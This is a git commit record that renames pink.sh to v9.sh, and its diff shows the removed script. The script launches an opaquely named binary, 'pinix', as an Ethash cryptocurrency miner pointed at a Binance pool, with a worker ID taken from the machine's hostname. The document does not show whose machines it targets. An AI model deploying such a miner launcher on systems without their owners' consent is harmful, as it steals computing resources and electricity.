60737861aed0262fa4d8e247d8c9e82911582792
Tataian2 <106037958+Tataian2@users.noreply.github.com>
2022-05-24 20:08:01 +0700

    Update and rename pink.sh to v9.sh

--- pink.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-
-POOL=ethash.poolbinance.com:1800
-WALLET=lancardong
-WORKER=$(echo "$(cat /proc/sys/kernel/hostname)" | tr . _ )
-
-cd "$(dirname "$0")"
-
-chmod +x ./pinix && ./pinix -wal $WALLET.$WORKER -epool $POOL -pass x $@
